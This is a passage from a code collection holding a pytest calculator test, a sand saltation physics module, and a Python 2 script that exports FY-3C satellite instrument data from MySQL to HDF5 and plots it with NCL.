Calc\r\r\r@pytest.fixture()\rdef method_calc():\r    return Calc\r\r\rclass TestCalc:\r    @pytest.mark.parametrize('a, b ,expected', yaml.safe_load(open('data.yml', 'r'))['add'])\r    def calc_add(self, method_calc, a, b, expected):\r        try:\r            calc_add = method_calc()\r            assert calc_add.add(a, b) == expected\r        except TypeError:\r            pytest.raises(TypeError)\r\r    @pytest.mark.parametrize('a, b ,expected', yaml.safe_load(open('data.yml', 'r'))['sub'])\r    def calc_sub(self, method_calc, a, b, expected):\r        try:\r            calc_sub = method_calc()\r            assert calc_sub.sub(a, b) == expected\r        except TypeError:\r            pytest.raises(TypeError)\r\r    @pytest.mark.parametrize('a, b ,expected', yaml.safe_load(open('data.yml', 'r'))['mul'])\r    def calc_mul(self, method_calc, a, b, expected):\r        try:\r            calc_mul = method_calc()\r            assert calc_mul.mul(a, b) == expected\r        except TypeError:\r            pytest.raises(TypeError)\r\r    @pytest.mark.parametrize('a, b ,expected', yaml.safe_load(open('data.yml', 'r'))['div'])\r    def calc_div(self, method_calc, a, b, expected):\r        try:\r            calc_div = method_calc()\r            assert calc_div.div(a, b) == expected\r        except TypeError:\r            pytest.raises(TypeError)\r\r\rif __name__ == '__main__':\r    pytest.main(['-m', 'add or div', 'test_calc.py'])\r", "486": "#saltation_module.py\n\n#written by George McDonald\n#written 6/11/20\n\n#Copyright 2022 George McDonald\n\n#This program is free software: you can redistribute it and/or modify\n#it under the terms of the GNU General Public License as published by\n#the Free Software Foundation, either version 3 of the License, or\n#(at your option) any later version.\n\n#This program is distributed in the hope that it will be useful,\n#but WITHOUT ANY WARRANTY; without even the implied warranty of\n#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#GNU General Public License for more details.\n\n#You should have received a copy of the GNU General Public License\n#along with this program.  If not, see .\n\n#Module for reformatting benefit report to highlight changes, remove\n#miscellaneous elements etc, thus preparing for sending to companies.\n#Elements borrowed from: https://stackoverflow.com/questions/40014989/python-xlrd-and-xlwt\n\n###############################################################################\nimport numpy as np\nfrom scipy.optimize import fsolve\n\n#Velocities of splashing grains. Kok et al. 2009a Equations 17 and 24.\ndef calc_v_ej_avg(v_imp,g,d):\n    #Average ejection velocity due to splashing.     \n    a_ej_avg=0.15   #Kok 2009a Table 1.\n    a=0.02          #Kok 2009a Table 1.\n    v_ej_avg=(a_ej_avg*np.sqrt(g*d)/a)*(1-np.exp(v_imp/(-40*np.sqrt(g*d))))\n    return v_ej_avg\n\ndef calc_P_v_ej(v_ej,v_imp,g,d):\n    #Probability distribution function value of ejection velocities at\n    #a particular ejection velocity.\n    P_v_ej=np.exp(-1*v_ej/calc_v_ej_avg(v_imp,g,d))/calc_v_ej_avg(v_imp,g,d)\n    return P_v_ej\n\ndef calc_v_ej_less(v_imp,g,d,dist_frxn):\n    #Velocity below which dist_frxn of  particles are ejected\n    v_ej_less=-1*calc_v_ej_avg(v_imp,g,d)*np.log(1-dist_frxn)\n    return v_ej_less\n\n\n#Saltation Initiation Functions. This is from Shao and Lu 2000.\n#u_ft terminology is from Telfer et al. 2018.\n\ndef calc_s(rho_p,rho_a):\n    return rho_p/rho_a\n\ndef calc_u_ft(rho_p,rho_a,d,g):    \n    an=0.0123\n    zeta=5e-4      #These are from Shao & Lu\n    print_str='WARNING: To replicate Pluto version we have to move replace\\n'+\\\n                'Shao and Lu Constant with different constant OUTSIDE square\\n'+\\\n                'square root, NOTE: order of operations'\n    print(print_str)\n    \n    ustar=np.sqrt(an*(d*g*calc_s(rho_p,rho_a) + zeta/(rho_a*d)))    \n    return ustar\n\n\n#Saltation Continuation Functions.\n#These are written as per Paehtz et al. 2012 equations 75a-75d.\n#u_t terminology is from Telfer et al. 2018.\n\ndef calc_u_t(mu,rho_p,rho_a,d,g,nu):\n    kappa=0.4   #von Karman constant\n    eta=0.1     #Efficiency of wind accel. of grains (Paehtz et al. 2012)\n    \n    ut=kappa*(calc_Vr(mu,rho_p,rho_a,d,g)+calc_Vo(rho_p,rho_a,d,g))/\\\n            ((1-eta)*np.log(calc_z_mt(mu,rho_p,rho_a,d,g)/\\\n              calc_z_o_grain_low_Re(mu,rho_p,rho_a,d,g)))\n    return ut\n\n#Smaller inputs into u_t\ndef calc_gt(rho_p,rho_a,g):\n    #This is g_tilda.\n    gt=g*(calc_s(rho_p,rho_a)-1)/calc_s(rho_p,rho_a)\n    return gt\n\ndef calc_gf(rho_p,rho_a,d,g):\n    zeta=5e-4\n    gf=calc_gt(rho_p,rho_a,g)+6.*zeta/(np.pi*rho_p*d**2.)\n    return gf\n\ndef calc_Vo(rho_p,rho_a,d,g):\n    Vo=16.2*np.sqrt(calc_gf(rho_p,rho_a,d,g)*d)\n    return Vo\n\n#Larger terms\ndef calc_Vt(mu,rho_p,rho_a,d,g):\n    eta=0.1\n    Vt=(calc_Vo(rho_p,rho_a,d,g)+eta*calc_Vr(mu,rho_p,rho_a,d,g))/(1-eta)\n    return Vt\n    \ndef calc_z_mt(mu,rho_p,rho_a,d,g):\n    alpha=1.02\n    beta_t=0.095\n    gamma=0.17\n    \n    z_mt=(alpha*beta_t*gamma*calc_Vr(mu,rho_p,rho_a,d,g)**(1/2.)*\\\n          calc_Vt(mu,rho_p,rho_a,d,g)**(3/2.))/calc_gt(rho_p,rho_a,g)\n    return z_mt\n\ndef calc_z_o_grain_low_Re(mu,rho_p,rho_a,d,g):\n    #This is the relation for particle Reynolds # < 3, equation E.3 in\n    #Paehtz et al. 2012.\n    z_o_grain=mu/(9.*rho_a*calc_u_ft(rho_p,rho_a,d,g))\n    return z_o_grain\n\n#For calculating the nonlinear Vr term\ndef Vr_func(Vr, *constants):\n    mu,rho_p,rho_a,d,g=constants\n    alpha=1.02\n    Vr_func=-1.*(4*calc_s(rho_p,rho_a)*calc_gt(rho_p,rho_a,g)*d/(3*alpha))+\\\n            (Vr**2.)*(1+(32.*mu/(Vr*rho_a*d))**(2/3.))**(3/2.)\n    return Vr_func\n\ndef calc_Vr(mu,rho_p,rho_a,d,g):\n    Vr=np.ones(d.shape[0])*np.nan\n    for di, d_val in enumerate(d):\n        constants=(mu,rho_p,rho_a,d_val,g)\n        Vr[di]=fsolve(Vr_func,10,args=constants)\n    return Vr", "487": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n\"\"\"Temporary program, draw OBC 2-dim and 3-dim data every 12 or 6 hours.\n\nUsage:\n    calc_draw_4sbus_mwhs.py --sat=fy3c --ins=mwhs --span=12 --date=now\n\nArguments:\n    sat: the satellite you want to calc, fy3c\n    ins: the insatrument you want to calc, mwts\n    span: hour span, 12 or 6. ONLY 12 is supported now.\n    date: draw for special date. YYYY-mm-dd-h like 2014-04-24-12 [default: now]\n        where 2014-04-24-12 means draw for launch time to today's 11:59\n\neg:\nif we are crontabed at 2013-12-06 14:00, we should draw for previous time zone \n(14:00-12) = 02:00, that is: launch time to today's 11:59's data.\n\"\"\"\n\n__author__ = 'gumeng'\n\n# Copyright (c) 2014, shinetek.\n# All rights reserved.\n#    \n# work flow:\n# crontabed every 12 or 6 hours, then\n#      check ps result, kill previous same program, avoiding hang.\n#      get time span\n#      get obc table list\n#      export all life obc data to hdf\n#      draw png\n#      mv png to dest path\n#         \n# /usr/bin/python /home/fymonitor/MONITORFY3C/py2/bin/calc_draw_obc.py \n# --sat=fy3c --ins=mwts --nwp=t639 --date=now\n# >> /home/fymonitor/DATA/LOG/calc_draw_obc.py.log 2>&1 &\n#                         \n# date          author    changes\n# 2014-05-19    gumeng    update\n# 2014-04-28    gumeng    create\n\nimport os\nimport sys\nimport time\nimport numpy\nimport signal\nimport commands\nimport warnings\nimport MySQLdb\nimport h5py as h5\nimport shutil\n#import datetime\n#from datetime import *\nfrom datetime import datetime\nfrom datetime import timedelta\nfrom multiprocessing import Pool\nfrom multiprocessing.dummy import Pool as ThreadPool \n\nwarnings.filterwarnings('ignore', category = MySQLdb.Warning)\n\ntimeuse_begin = time.time()\n\nsys.path.append('/home/fymonitor/MONITORFY3C/py2/conf')\nconf = __import__('conf')\ncommon = __import__('common')\ndocopt = __import__('docopt')\n\n# set read-only global variables.\n\narguments = docopt.docopt(__doc__)\nsat = arguments['--sat'].lower()\nins = arguments['--ins'].lower()\nhour_span = arguments['--span'].lower()\norig_calc_date = arguments['--date'].lower()\ncalc_date = orig_calc_date\n\nins_conf_file = sat.upper() + '_' + ins.upper() + '_CONF'\nins_conf = __import__(ins_conf_file)\n\nif sat not in conf.support_sat_ins or ins not in conf.support_sat_ins[sat]:\n    print 'sat or ins setting is NOT found in conf.py'\n    sys.exit(0)\n    \npid = os.getpid()\nfname = os.path.splitext(os.path.basename(os.path.realpath(__file__) ) )[0]\nlog_tag = fname + '.' + sat + '.' + ins + '.' + str(pid)\nmy_name = common.get_local_hostname()\nmy_tag = my_name+'.'+log_tag\nmy_pidfile = conf.pid_path + '/' + my_name + '.' + fname + '.' + sat + '.' \\\n            + ins + '.pid'\nmy_alivefile = conf.pid_path + '/' + my_name + '.' + fname + '.' + sat + '.' \\\n            + ins + '.alive'\nmy_log = conf.log_path + '/' + my_name + '.' # just prefix: /log/path/prefix.\n\n#get the correct time span.\nif calc_date == 'now':\n    calc_date = common.utc_YmdH()\ntimespan = common.get_calc_timespan(calc_date, hour_span)\ntimespan['begin_t'] = 0 # the min time stamp before launch.\ntime_tag = timespan['begin_str'] + '`' + timespan['end_str'] + '`'\n\n# mysql tables we should draw\nmy_Calc_channel_table = []\nmy_channel_table = []\nmy_obc_table = []\nmy_Calc_table = []\n\nCalc_table_3day = []\nCalc_table_1month =[]\n\nobc_table_3day = []\nobc_table_1month = []\n\nchannel_table_3day = []\nchannel_table_1month = []\n\nCalc_channel_table_3day = []\nCalc_channel_table_1month = []\n\n# Deal with signal.\ndef signal_handler(signum, frame):\n    msg = 'FAILED`recv signal ' + str(signum) + '. exit now.'\n    common.info(my_log, log_tag, time_tag + msg)\n\n    if os.path.isfile(my_pidfile):\n        os.remove(my_pidfile)\n    \n    sys.exit(0)\n\n# create hdf by obc setting\ndef create_obc_hdf(name_tage,hfile,numpy_data, obc_setting):\n    \n\n    try:\n        \n        previous_idx = 0 # time idx = 0\n        for one_setting in obc_setting:\n            start_idx = previous_idx + 1\n            for one_column in xrange(1, one_setting['columns'] + 1):\n                if one_setting['columns'] == 1:\n                    ds_name = one_setting['db_field'] + '_' + name_tage\n                else:\n                    ds_name = one_setting['db_field'] + str(one_column) + '_'+ name_tage\n\n                idx = start_idx + one_column - 1\n                #factor = int(one_setting['factor'])\n                #print one_setting['factor'] \n                factor =one_setting['factor']         \n                \n#                 if 'float' in one_setting['hdf_dtype'] \\\n#                     and 'int' in one_setting['db_dtype']:\n#                     hfile.create_dataset(ds_name, data = \\\n#                             numpy_data[:, idx].astype(numpy.float32)*1/factor)\n                if 'float' in one_setting['hdf_dtype'] \\\n                    and 'int' in one_setting['db_dtype']:\n                    hfile.create_dataset(ds_name, data = \\\n                            (numpy_data[:, idx].astype(numpy.float32)*1/factor).astype(numpy.float32))\n                    \n                elif 'tinyint' in one_setting['hdf_dtype'] \\\n                    and 'tinyint' in one_setting['db_dtype']:\n                    hfile.create_dataset(ds_name, data = \\\n                            (numpy_data[:, idx].astype(numpy.float32)*1/factor).astype(numpy.float32))\n                elif 'int' in one_setting['hdf_dtype'] \\\n                    and 'int' in one_setting['db_dtype']:\n                    hfile.create_dataset(ds_name, data = \\\n                            (numpy_data[:, idx].astype(numpy.int32)*1/factor).astype(numpy.float32))\n                elif 'float' in one_setting['hdf_dtype'] \\\n                    and 'float' in one_setting['db_dtype']:\n                    hfile.create_dataset(ds_name, data = \\\n                            (numpy_data[:, idx].astype(numpy.float32)*1/factor).astype(numpy.float32))\n                elif 'float' in one_setting['hdf_dtype'] \\\n                    and 'smallint unsigned' in one_setting['db_dtype']:\n                    hfile.create_dataset(ds_name, data = \\\n                            (numpy_data[:, idx].astype(numpy.float32)*1/factor).astype(numpy.float32))\n                \n                else:\n                    #pass\n                    hfile.create_dataset(ds_name, data = \\\n                            (numpy_data[:, idx].astype(numpy.float32)*1/factor).astype(numpy.float32))\n                \n                previous_idx += 1\n    except:\n        return False\n    \n    return True\n\ndef draw_one_channel(channel):\n    if len(channel_table_3day) <= 0:\n        return True\n    if len(channel_table_1month) <= 0:\n        return True\n    if len(Calc_channel_table_3day) <= 0:\n        return True\n    if len(Calc_channel_table_1month) <= 0:\n        return True\n    \n    tmpfile3day = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS() \\\n            + '.ch' + format(channel, '02d') + '.3day'\n    sql_3day = common.get_obc_3dim_sql(ins_conf.obc_3dim_to_db.values(),str(channel),\n                                  channel_table_3day, conf.obc_select_prefix_sql,\n                                  conf.obc_3dim_where_sql) \\\n        + conf.export_txt%(tmpfile3day + '.txt')\n    begin_sql_3day = conf.obc_select_prefix_sql + ' 1 from ' + channel_table_3day[0] \\\n                + conf.obc_3dim_where_sql + str(channel) + \" limit 1\"\n                \n    tmpfile1month = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS() \\\n            + '.ch' + format(channel, '02d')+ '.1month' \n    sql_1month = common.get_obc_3dim_sql(ins_conf.obc_3dim_to_db.values(),str(channel),\n                                  channel_table_1month, conf.obc_select_prefix_sql,\n                                  conf.obc_3dim_where_sql) \\\n        + conf.export_txt%(tmpfile1month + '.txt')\n        \n        \n    tmpfile3day_calc = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS() \\\n            + '.ch' + format(channel, '02d') + '.3day_calc'\n    sql_3day_calc = common.get_obc_3dim_sql(ins_conf.calc_3dim_to_db.values(),str(channel),\n                                  Calc_channel_table_3day, conf.obc_select_prefix_sql,\n                                  conf.obc_3dim_where_sql) \\\n        + conf.export_txt%(tmpfile3day_calc + '.txt')\n    \n                \n    tmpfile1month_calc = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS() \\\n            + '.ch' + format(channel, '02d')+ '.1month_calc' \n    sql_1month_calc = common.get_obc_3dim_sql(ins_conf.calc_3dim_to_db.values(),str(channel),\n                                  Calc_channel_table_1month, conf.obc_select_prefix_sql,\n                                  conf.obc_3dim_where_sql) \\\n        + conf.export_txt%(tmpfile1month_calc + '.txt')    \n        \n\n    try:\n        conn=MySQLdb.connect(host=conf.db_setting['master']['ip'], \n                             user=conf.db_setting['master']['user'],\n                             passwd=conf.db_setting['master']['pwd'], \n                             port=conf.db_setting['master']['port'])\n        cur=conn.cursor(MySQLdb.cursors.DictCursor)\n        conn.select_db(conf.table_setting[sat][ins]['data_db'])      \n        cur.execute(sql_3day)\n        cur.execute(sql_1month)\n        #print Calc_channel_table_3day\n        #print \"-------------------------------------\"\n        #print sql_1month_calc\n        cur.execute(sql_3day_calc)\n        cur.execute(sql_1month_calc)\n        cur.execute(begin_sql_3day)\n        begin_data = cur.fetchall()\n        cur.close()\n        conn.close()\n    except MySQLdb.Error, e:\n        # do NOT exit in thread!! To avoid zombie process.\n        msg = 'draw obc 3-dim ch' + str(channel) + ' png`Mysql Fatal Error[' \\\n            + str(e.args[0]) + ']: ' + e.args[1]              \n        common.err(my_log, log_tag, time_tag + msg)\n        return False\n\n    tmpfile1year = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS() + '.CH' + format(channel, '02d') +'.1year' + '.obc'\n    tmpfilelife = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS() + '.CH' + format(channel, '02d') +'.life' + '.obc'\n\n    get_channel_txt(tmpfile1year,tmpfilelife,'agc_control_volt_count',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'antenna_bt_calibration_coef1',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'antenna_bt_calibration_coef2',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'synthetic_bright_temp',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count1',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count2',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count3',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count4',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count5',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count6',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count7',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count8',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count9',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count10',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count11',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count12',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count13',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count14',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count15',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count16',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count17',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count18',channel)\n    \n    \n\n    \n    \n    tmphdf = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS()+ '.CH' +format(channel, '02d')+'.HDF'\n    print tmphdf\n    # trans txt result to numpy fmt, to easy hdf create.\n    data_3day = numpy.loadtxt(tmpfile3day + '.txt', dtype='str', delimiter=',')\n    data_1month = numpy.loadtxt(tmpfile1month + '.txt', dtype='str', delimiter=',')\n    \n    data_3day_calc = numpy.loadtxt(tmpfile3day_calc + '.txt', dtype='str', delimiter=',')\n    data_1month_calc = numpy.loadtxt(tmpfile1month_calc + '.txt', dtype='str', delimiter=',')\n    \n\n    hfile = h5.File(tmphdf, 'w') # w: rewrite if hdf already exist.\n    ymdh_arr = numpy.array(map(common.time_to_arr, data_1month[:, 0]) )\n    hfile.create_dataset(\"time_1month\", data = ymdh_arr.astype(numpy.int32))\n    \n    ymdh_arr = numpy.array(map(common.time_to_arr, data_1month_calc[:, 0]) )\n    hfile.create_dataset(\"time_1month_calc\", data = ymdh_arr.astype(numpy.int32))\n     \n    ret = create_obc_hdf('1month',hfile,data_1month, ins_conf.obc_3dim_to_db_out.values())\n    ret = create_obc_hdf('1month',hfile,data_1month_calc, ins_conf.calc_3dim_to_db_out.values())\n    if not ret:\n        return False\n    \n    ymdh_arr = numpy.array(map(common.time_to_arr, data_3day[:, 0]) )\n    hfile.create_dataset(\"time_3day\", data = ymdh_arr.astype(numpy.int32)) \n    \n    ymdh_arr = numpy.array(map(common.time_to_arr, data_3day_calc[:, 0]) )\n    hfile.create_dataset(\"time_3day_calc\", data = ymdh_arr.astype(numpy.int32))\n        \n    ret = create_obc_hdf('3day',hfile,data_3day, ins_conf.obc_3dim_to_db_out.values())\n    ret = create_obc_hdf('3day',hfile,data_3day_calc, ins_conf.calc_3dim_to_db_out.values())\n    if not ret:\n        return False\n    \n    #hfile = h5.File(tmphdf, 'w') # w: rewrite if hdf already exist.\n    #ymdh_arr = numpy.array(map(common.time_to_arr, data_1month_calc[:, 0]) )\n    #hfile.create_dataset(\"time_1month_channel_calc\", data = ymdh_arr.astype(numpy.int32)) \n    #ret = create_obc_hdf('1month',hfile,data_1month_calc, ins_conf.calc_3dim_to_db.values())\n    #if not ret:\n    #    return False\n    \n    #ymdh_arr = numpy.array(map(common.time_to_arr, data_3day_calc[:, 0]) )\n    #hfile.create_dataset(\"time_3day_channel_calc\", data = ymdh_arr.astype(numpy.int32))     \n    #ret = create_obc_hdf('3day',hfile,data_3day_calc, ins_conf.calc_3dim_to_db.values())\n    #if not ret:\n    #    return False\n\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'agc_control_volt_count','agc_control_volt_count',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'antenna_bt_calibration_coef1','antenna_bt_calibration_scale',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'antenna_bt_calibration_coef2','antenna_bt_calibration_offset',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'synthetic_bright_temp','synthetic_bright_temp',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count1','Scan_warm_observation_counts1',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count2','Scan_warm_observation_counts2',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count3','Scan_warm_observation_counts3',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count4','Scan_warm_observation_counts4',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count5','Scan_warm_observation_counts5',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count6','Scan_warm_observation_counts6',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count7','Scan_warm_observation_counts7',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count8','Scan_warm_observation_counts8',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count9','Scan_warm_observation_counts9',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count10','Scan_warm_observation_counts10',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count11','Scan_warm_observation_counts11',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count12','Scan_warm_observation_counts12',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count13','Scan_cold_observation_counts1',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count14','Scan_cold_observation_counts2',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count15','Scan_cold_observation_counts3',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count16','Scan_cold_observation_counts4',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count17','Scan_cold_observation_counts5',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'sp_it_cal_obs_count18','Scan_cold_observation_counts6',hfile)\n    \n    \n\n    hfile.close()\n    \n    #return \n    \n\n\n    # like: FY3C_MWTS_20140303_0259_TO_20140428_1159_12H_CH01_[PRT|INS_TEMP|...]\n    png_title = sat.upper() + '_' + ins.upper() + '_' \\\n                + begin_data[0]['ymdhms'].strftime(\"%Y%m%d\") + '_' \\\n                + begin_data[0]['ymdhms'].strftime(\"%H%M\") + '_TO_' \\\n                + datetime.utcfromtimestamp(timespan['end_t']).strftime('%Y%m%d') \\\n                + '_' \\\n                + datetime.utcfromtimestamp(timespan['end_t']).strftime('%H%M') \\\n                + '_' \\\n                + format(int(hour_span), '02d') + 'H_CH' \\\n                + format(channel,'02d')\n    \n    ret = draw_channel(tmphdf, format(channel,'02d'), png_title,begin_data[0]['ymdhms'].strftime(\"%Y%m%d\"),\\\n                       datetime.utcfromtimestamp(timespan['end_t']).strftime('%Y%m%d'))\n    \n    return True\n\ndef draw_channel(tmphdf, channel, png_title, begin_time, end_time):\n    cmd = []\n    sds_len = len(conf.draw_ncl_new[ins]['ncl_prog_channel'])\n    for i in xrange(0, sds_len): \n        file_out = \"/home/fymonitor/MONITORFY3C/py2/plot/\" + png_title + '_' + conf.draw_ncl_new[ins]['ncl_prog_channel'][i]['tmp_png']\n        ncl_name = \"/home/fymonitor/MONITORFY3C/py2/plot/\" + sat.upper() + '_' + ins.upper()+'_' + conf.draw_ncl_new[ins]['ncl_prog_channel'][i]['tmp_png'] + '_4SUB.ncl'\n        temp_log = conf.tmp_path + '/monitor.' + log_tag + '.ch' + channel+'.' + conf.draw_ncl_new[ins]['ncl_prog_channel'][i]['tmp_png'] +'.log'\n        temp_cmd = conf.ncl + \" 'sat=\\\"\" + sat.upper() + \"\\\"' \" \\\n            + \"'instrument=\\\"\" + ins.upper() + \"\\\"' channel=\" + str(channel) \\\n            + \" 'file_in=\\\"\" + tmphdf + \"\\\"' \" \\\n            + \" 'file_out=\\\"\" + file_out + \"\\\"' \" \\\n            + \" 'file_title=\\\"\" + png_title + '_' +conf.draw_ncl_new[ins]['ncl_prog_channel'][i]['tmp_png'] + \"\\\"' \" +  ncl_name \\\n            + ' > ' + temp_log + ' 2>&1'\n        print temp_cmd\n        \n        cmd.append(temp_cmd)\n\n    #print cmd\n\n    #use map:16.6s ; not use map:44.52s\n    timeuse_begin = time.time()\n    \n    for cmd_temp in cmd:\n        print cmd_temp\n        (status, output) = commands.getstatusoutput(cmd_temp)\n        common.debug(my_log, log_tag, str(status) + '`' + cmd_temp + '`' + output)\n    \n#     pooltest = ThreadPool()\n#     ret = pooltest.map(commands.getstatusoutput, cmd )\n#     pooltest.close()\n#     pooltest.join()\n\n    timeuse_end = time.time()\n    timeuse = str(round(timeuse_end - timeuse_begin, 2))\n    print timeuse\n    \n    sds_len = len(conf.draw_ncl_new[ins]['ncl_prog_channel'])\n    for i in xrange(0, sds_len): \n        file_out = \"/home/fymonitor/MONITORFY3C/py2/plot/\" + png_title + '_' + conf.draw_ncl_new[ins]['ncl_prog_channel'][i]['tmp_png']\n        temp_log = conf.tmp_path + '/monitor.' + log_tag + '.ch' + channel+'.' + conf.draw_ncl_new[ins]['ncl_prog_channel'][i]['tmp_png'] +'.log'\n        # check png.OK\n        if not common.check_file_exist(file_out + '.png', check_ok = True):\n            msg = 'ncl program error: output png file not exist.' + file_out\n            print msg\n            common.error(my_log, log_tag, time_tag + msg)\n            return False\n        dest_path = '/hds/assimilation/fymonitor/DATA/IMG/NSMC' + '/' + sat.upper() + '/' + ins.upper() + '/' \\\n                  + conf.draw_ncl_new[ins]['ncl_prog_channel'][i]['tmp_png'] + '/' \n        arch_path = dest_path + str(end_time[0:4]) + '/'\n        latest_path = dest_path + 'LATEST/' + str(channel) + '/'\n        \n        try:\n            shutil.copyfile(file_out + '.png', arch_path + png_title + '_' + conf.draw_ncl_new[ins]['ncl_prog_channel'][i]['tmp_png'] + '.png')\n            common.empty_folder(latest_path)\n            common.mv_file(file_out + '.png', latest_path + png_title + '_' + conf.draw_ncl_new[ins]['ncl_prog_channel'][i]['tmp_png'] + '.png')\n            os.remove(file_out + '.png.OK')\n            os.remove(temp_log)\n        except:\n            msg = 'png created, but cp or mv to dest error'\n            print msg\n            common.error(my_log, log_tag, time_tag + msg)\n            return False\n    try:\n        os.remove(tmphdf)\n    except OSError,e:\n        msg = 'clean tmp file error[' + str(e.args[0])+']: ' + e.args[1] \n        print msg             \n        common.warn(my_log, log_tag, time_tag + msg)\n\n    return True\n\ndef get_channel_txt(tmpfile1year,tmpfilelife,type,channel):\n    #now_time = datetime.datetime.now()\n    now_time = datetime.now()\n    #yes_time = now_time + datetime.timedelta(days=(-365))\n    yes_time = now_time + timedelta(days=(-365))\n    last_year = yes_time.strftime('%Y-%m-%d %H:%M:%S')\n\n    #select * from FY3C_MWTS_DAILY order by ymdh desc limit 365;\n    sql_1year = 'select * from FY3C_MWRI_DAILY_10 where type = \\''+type + \\\n                '\\'' + ' and channel = ' + str(channel) +' and ymdh > ' + '\\'' +last_year + '\\'' + \\\n                conf.export_txt%(tmpfile1year +'.' +type + '.txt')\n\n    sql_life = 'select * from FY3C_MWRI_DAILY_10 where type = \\''+type + \\\n                '\\''  + ' and channel = ' + str(channel)\\\n                + conf.export_txt%(tmpfilelife +'.' +type + '.txt')\n\n    try:\n        conn=MySQLdb.connect(host=conf.db_setting['master']['ip'], \n                             user=conf.db_setting['master']['user'],\n                             passwd=conf.db_setting['master']['pwd'], \n                             port=conf.db_setting['master']['port'])\n        cur=conn.cursor(MySQLdb.cursors.DictCursor)\n        conn.select_db(conf.db_setting['stat_db'])      \n        cur.execute(sql_1year)\n        cur.execute(sql_life)\n        begin_data = cur.fetchall()\n        cur.close()\n        conn.close()\n    except MySQLdb.Error, e:\n        # do NOT exit in thread!! To avoid zombie process.\n        msg = 'export channel date `Mysql Fatal Error[' + str(e.args[0]) \\\n            + ']: ' + e.args[1] \n        print msg             \n        common.err(my_log, log_tag, time_tag + msg)\n        return False\n\n\n\n\n#2014-08-08 00:00:00\ndef get_obc_txt(tmpfile1year,tmpfilelife,type):\n    #now_time = datetime.datetime.now()\n    now_time = datetime.now()\n    #yes_time = now_time + datetime.timedelta(days=(-365))\n    yes_time = now_time + timedelta(days=(-365))\n    last_year = yes_time.strftime('%Y-%m-%d %H:%M:%S')\n    \n    \n    #select * from FY3C_MWTS_DAILY order by ymdh desc limit 365;\n    sql_1year = 'select * from FY3C_MWRI_DAILY where type = \\''+type + \\\n                '\\'' + ' and ymdh > ' + '\\'' +last_year + '\\'' + \\\n                conf.export_txt%(tmpfile1year +'.' +type + '.txt')\n    sql_life = 'select * from FY3C_MWRI_DAILY where type = \\''+type + '\\''\\\n                + conf.export_txt%(tmpfilelife +'.' +type + '.txt')\n                \n    #print sql_1year\n    #print \"----------\"\n    #print sql_life\n\n\n    try:\n        